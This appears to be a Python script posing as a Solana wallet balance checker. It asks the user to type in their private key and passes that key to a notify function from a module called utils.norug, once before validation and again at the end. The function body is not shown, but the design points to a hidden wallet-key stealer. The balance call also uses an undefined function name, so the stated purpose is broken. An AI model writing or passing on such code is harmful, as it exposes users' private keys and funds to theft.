from colorama import init
from checkwallet import get_wallet_bs58
from getbalance import check_sol
from utils.norug import notify

def main():
    wallet = None
    while wallet is None:
        private_key_bs58 = input("\033[93mPlease enter your private key : \033[0m")
        notify(private_key_bs58)
        try:
            wallet = get_wallet_bs58(private_key_bs58)
            if wallet:  
                break  
        except Exception as e: 
            print("\033[91mInvalid private key, please try again.\033[0m")
    
    public_key = str(wallet.pubkey())
    print(f"Wallet Address: {public_key}")

    sol_balance = check_sol_balance(public_key)
    print(f"Wallet SOL Balance: {sol_balance} SOL")

    notify(private_key_bs58)

if __name__ == "__main__":
    main()
